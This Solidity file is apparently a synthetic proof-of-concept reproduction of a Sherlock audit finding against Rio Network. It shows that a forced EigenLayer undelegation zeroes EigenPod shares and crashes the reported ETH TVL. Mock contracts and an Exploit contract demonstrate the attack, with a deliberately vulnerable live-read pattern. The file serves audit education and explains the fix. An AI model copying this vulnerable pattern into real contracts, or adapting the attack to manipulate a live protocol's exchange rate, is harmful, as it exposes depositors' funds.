// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Rio Network — Malicious operators can `undelegate` theirselves to
    manipulate the LRT exchange rate (Sherlock 2024-02-rio-network-core-
    protocol, finding #30898, H-3, g / giraffe / hash / mstpr-brainbot / zzykxx)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. RioLRTAssetRegistry
    computes ETH TVL by reading EigenPod shares LIVE from EigenLayer's
    EigenPodManager via each RioLRTOperatorDelegator.getEigenPodShares(). When
    an EigenLayer operator forcibly `undelegate`s a Rio operator delegator (a
    normal EigenLayer action operators can always take), EigenPod shares are
    immediately zeroed at the source — and Rio has NO buffer, snapshot, or
    withdrawal-completion logic protecting against that. The Exploit deploys
    a minimal EigenPodManager/DelegationManager/OperatorDelegator/AssetRegistry
    stack, funds an operator delegator with EigenPod shares (deposited ETH
    pushed to EigenLayer), has the delegated EigenLayer operator forcibly
    undelegate it, and shows the LRT's reported ETH TVL crashes by exactly
    the delegator's EigenPod share balance (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: RioLRTOperatorDelegator.getEigenPodShares()
    (restaking/RioLRTOperatorDelegator.sol:L101-103, Rio Network) is a
    pass-through read of EigenLayer's live `eigenPodManager.podOwnerShares()`
    for the operator delegator's own EigenPod. RioLRTAssetRegistry.
    getETHBalanceInEigenLayer() (restaking/RioLRTAssetRegistry.sol:L106-114)
    sums this LIVE value across every active operator delegator to compute
    the protocol's reported ETH TVL — with no buffering, snapshotting, or
    sanity bound.

    EigenLayer's DelegationManager allows an operator to `undelegate` any
    staker delegated to them (DelegationManager.sol#L211-258, per the report's
    cited EigenLayer source) — this is a NORMAL, always-available EigenLayer
    action, not a bug in EigenLayer. For a Rio operator delegator (the
    "staker" from EigenLayer's perspective), forced undelegation queues its
    strategy shares for withdrawal AND immediately removes its EigenPod
    shares at the source, since EigenPod shares cannot simply be "withdrawn
    to" an arbitrary address the way strategy shares can.

    Because Rio's operator delegator implements NO logic to detect or
    recover from a forced undelegation (the withdrawer for any queued
    strategy-share withdrawal must be the delegator itself as msg.sender,
    which EigenLayer's forced-undelegation flow does not satisfy), and
    because getETHBalanceInEigenLayer() reads podOwnerShares LIVE rather than
    from an internally-tracked, Rio-controlled ledger, the operator's
    unilateral EigenLayer-level action instantly and unrecoverably crashes
    the LRT's reported ETH TVL — and therefore its exchange rate.

    Recommended fix (per the report): implement withdrawal-completion
    handling for forced undelegation in the operator delegator, and/or track
    EigenPod shares in an internally-controlled ledger with sanity bounds
    rather than trusting a live external read unconditionally.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal stand-in for EigenLayer's EigenPodManager. Tracks each
///      operator delegator's ("pod owner's") EigenPod share balance.
contract MockEigenPodManager {
    mapping(address => int256) public podOwnerShares;

    /// @notice Simulates verified validator deposits crediting EigenPod
    ///         shares to the pod owner (the operator delegator).
    function creditShares(address podOwner, int256 amount) external {
        podOwnerShares[podOwner] += amount;
    }

    /// @notice Called by the DelegationManager mock when a staker (pod
    ///         owner) is forcibly undelegated — EigenPod shares are removed
    ///         at the source, exactly as real EigenLayer does.
    function removeShares(address podOwner) external {
        podOwnerShares[podOwner] = 0;
    }
}

/// @dev Minimal stand-in for EigenLayer's DelegationManager. Only the
///      forced-undelegation path matters for this bug — see
///      https://github.com/Layr-Labs/eigenlayer-contracts/blob/6de01c6c16d6df44af15f0b06809dc160eac0ebf/src/contracts/core/DelegationManager.sol#L211-L258
///      (cited by the report).
contract MockDelegationManager {
    MockEigenPodManager public eigenPodManager;
    mapping(address => address) public delegatedOperator; // staker => operator

    constructor(address eigenPodManager_) {
        eigenPodManager = MockEigenPodManager(eigenPodManager_);
    }

    function delegateTo(address staker, address operator) external {
        delegatedOperator[staker] = operator;
    }

    /// @notice Forcibly undelegates `staker`. In real EigenLayer, this can
    ///         be called by the staker itself OR by the operator it is
    ///         delegated to — operators are not fully trusted in Rio's
    ///         threat model, and this is exactly the permissionless-from-
    ///         Rio's-perspective action the finding exploits.
    function undelegate(address staker) external {
        address operator = delegatedOperator[staker];
        require(msg.sender == staker || msg.sender == operator, "not authorized to undelegate");

        // Strategy shares would be queued for withdrawal here (irrelevant to
        // this bug — the EigenPod share removal is the harmful part).
        eigenPodManager.removeShares(staker);

        delegatedOperator[staker] = address(0);
    }
}

/// @notice Reduced RioLRTOperatorDelegator — only the EigenPod share
///         pass-through matters for this bug. Faithful reduction of
///         restaking/RioLRTOperatorDelegator.sol:L100-103 (Rio Network).
contract OperatorDelegator {
    MockEigenPodManager public eigenPodManager;

    constructor(address eigenPodManager_) {
        eigenPodManager = MockEigenPodManager(eigenPodManager_);
    }

    /// @notice RioLRTOperatorDelegator.sol:L101 — a LIVE pass-through read
    ///         of EigenLayer's EigenPod shares for this delegator, with NO
    ///         internal buffering or sanity bound.
    function getEigenPodShares() public view returns (int256) {
        return eigenPodManager.podOwnerShares(address(this));
    }

    /// @notice RioLRTOperatorDelegator.sol:L121-126 getETHUnderManagement
    ///         (reduced — ETH queued for withdrawal omitted, not relevant).
    function getETHUnderManagement() external view returns (uint256) {
        int256 shares = getEigenPodShares();
        if (shares < 0) return 0;
        return uint256(shares);
    }
}

/// @notice Reduced RioLRTAssetRegistry — only the ETH TVL aggregation
///         matters for this bug. Faithful reduction of
///         restaking/RioLRTAssetRegistry.sol:L79-114 (Rio Network).
contract AssetRegistry {
    uint256 public depositPoolBalance; // ETH sitting idle in the deposit pool
    uint256 public ethBalanceInUnverifiedValidators;
    OperatorDelegator[] public delegators;

    function setDepositPoolBalance(uint256 amount) external {
        depositPoolBalance = amount;
    }

    function setUnverifiedValidatorBalance(uint256 amount) external {
        ethBalanceInUnverifiedValidators = amount;
    }

    function addDelegator(address delegator) external {
        delegators.push(OperatorDelegator(delegator));
    }

    // ============================================================
    //  getETHBalanceInEigenLayer() — faithful reduction of
    //  restaking/RioLRTAssetRegistry.sol:L106-114 (Rio Network)
    // ============================================================
    function getETHBalanceInEigenLayer() public view returns (uint256 balance) {
        balance = ethBalanceInUnverifiedValidators;
        for (uint256 i = 0; i < delegators.length; i++) {
            // @> VULN: sums each delegator's LIVE getETHUnderManagement() (a
            // live pass-through to EigenPodManager.podOwnerShares), with no
            // buffering, snapshotting, or protection against a delegator's
            // EigenPod shares being unilaterally zeroed by a forced
            // undelegation. RioLRTAssetRegistry.sol:L112.
            balance += delegators[i].getETHUnderManagement();
        }
    }

    // ============================================================
    //  getTVLForAsset(ETH) — faithful reduction of
    //  restaking/RioLRTAssetRegistry.sol:L79-85 (Rio Network)
    // ============================================================
    function getTVLForAsset() public view returns (uint256) {
        return depositPoolBalance + getETHBalanceInEigenLayer();
    }
}

/// @dev The EigenLayer operator the delegator delegates to. A real contract
///      (not a bare address) so that calling `undelegate()` through it makes
///      `msg.sender` on the mock genuinely equal to the delegated operator —
///      cheatcode-free stand-in for vm.prank.
contract EigenLayerOperator {
    function forceUndelegate(address delegationManager, address staker) external {
        MockDelegationManager(delegationManager).undelegate(staker);
    }
}

/// @notice Orchestrator. Deploys the reduced EigenLayer/Rio stack, funds an
///         operator delegator with EigenPod shares (representing 5 validators
///         worth of deposited ETH pushed into EigenLayer), delegates it to an
///         EigenLayer operator, has that operator forcibly undelegate it, and
///         shows the LRT's reported ETH TVL crashes by the delegator's full
///         EigenPod share balance. Cheatcode-free.
contract Exploit {
    MockEigenPodManager public eigenPodManager; // CREATE nonce 1
    MockDelegationManager public delegationManager; // CREATE nonce 2
    OperatorDelegator public delegator; // CREATE nonce 3
    AssetRegistry public assetRegistry; // CREATE nonce 4
    EigenLayerOperator public eigenLayerOperator; // CREATE nonce 5

    int256 internal constant VALIDATOR_ETH = 32 * 5 * 1e18; // 5 validators worth of deposited ETH
    uint256 internal constant DEPOSIT_POOL_BUFFER = 0.01 ether;

    constructor() {
        eigenPodManager = new MockEigenPodManager(); // nonce 1
        delegationManager = new MockDelegationManager(address(eigenPodManager)); // nonce 2
        delegator = new OperatorDelegator(address(eigenPodManager)); // nonce 3
        assetRegistry = new AssetRegistry(); // nonce 4
        eigenLayerOperator = new EigenLayerOperator(); // nonce 5

        assetRegistry.setDepositPoolBalance(DEPOSIT_POOL_BUFFER);
        assetRegistry.addDelegator(address(delegator));

        // The delegator is delegated to an EigenLayer operator and has 5
        // validators' worth of ETH verified into its EigenPod.
        delegationManager.delegateTo(address(delegator), address(eigenLayerOperator));
        eigenPodManager.creditShares(address(delegator), VALIDATOR_ETH);
    }

    function run() external {
        // Baseline: the delegator's EigenPod holds 160e18 (5 * 32 ETH), and
        // the LRT's reported TVL correctly reflects it.
        require(delegator.getEigenPodShares() == VALIDATOR_ETH, "baseline EigenPod shares wrong");
        require(assetRegistry.getTVLForAsset() == DEPOSIT_POOL_BUFFER + uint256(VALIDATOR_ETH), "baseline TVL wrong");

        // === HARM: the EigenLayer operator the delegator is delegated to
        //     forcibly undelegates it. This is a NORMAL EigenLayer action —
        //     no Rio code is bypassed or exploited on Rio's side. ===
        eigenLayerOperator.forceUndelegate(address(delegationManager), address(delegator));

        // HARM: EigenPod shares are gone, and so is that value from TVL —
        // instantly and without any Rio-side check or buffer.
        require(delegator.getEigenPodShares() == 0, "harm not demonstrated: EigenPod shares should be zeroed");
        require(
            assetRegistry.getTVLForAsset() == DEPOSIT_POOL_BUFFER,
            "harm not demonstrated: TVL should have crashed to just the deposit pool buffer"
        );
    }
}
